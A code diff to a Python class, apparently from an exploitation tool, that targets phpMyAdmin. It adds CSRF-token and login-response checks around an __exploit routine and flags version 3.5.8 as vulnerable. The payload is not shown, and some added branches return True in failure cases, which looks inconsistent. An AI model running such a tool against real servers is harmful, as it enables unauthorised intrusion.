@@ -20,8 +20,15 @@ class PHPMyAdmin:
     def __csrf(self):
         log.debug(f"[!] Getting CSRF Token ({self.__host})")
         r = self.__requests.get(f"http://{self.__host}:{self.__port}{self.__path}")
+        if r.status_code != 200:
+            log.info(f"[!] Unable to get CSRF Token. PHPMyAdmin not up ({self.__host})")
+            return False
+        if 'name="token" value=' not in r.text:
+            log.info(f"[!] Unable to get CSRF Token. PHPMyAdmin not up ({self.__host})")
+            return False
         soup = BeautifulSoup(r.text, "lxml")
         self.__token = soup.select_one('input[name="token"]')["value"]
+        return True
 
     def __exploit(self):
         params = {
@@ -41,6 +48,9 @@ class PHPMyAdmin:
         if "phpMyAdmin 3.5.8" in title:
             log.info(f"[!] PHPMyAdmin is vulnerable ({self.__host})")
             return True
+        if not "Cannot log in to the MySQL server" in r.text:
+            log.info(f"[!] Issue with login. Unexpected return data ({self.__host})")
+            return True
         log.info(f"[!] PHPMyAdmin is secure ({self.__host})")
         return False
 
@@ -49,7 +59,8 @@ class PHPMyAdmin:
         log.debug(f"[*] Exploiting PHPMyAdmin ({self.__host})")
         if port:
             self.__port = port
-        self.__csrf()
+        if not self.__csrf():
+            return True
         return self.__exploit()
 
 
